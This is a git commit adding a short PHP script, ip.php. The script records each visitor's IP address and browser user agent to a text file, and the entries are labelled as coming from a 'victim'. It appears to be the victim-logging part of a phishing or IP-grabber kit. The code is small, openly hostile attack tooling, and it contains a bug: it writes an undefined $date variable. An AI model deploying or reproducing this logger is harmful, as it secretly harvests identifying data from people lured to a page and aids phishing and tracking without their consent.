376274e9b86dfaf0a83fb5aaa2d4cc994d298bc9
Mukesh Mahato <55306415+mukeshmahato843@users.noreply.github.com>
2020-07-17 07:23:18 +0545

    Create ip.php

---
+++ ip.php
@@ -0,0 +1,31 @@
+<?php
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = "User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$dev = "Developer : Mukesh Mahato";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $dev);
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+fwrite($fp, $date);
+
+fclose($fp);
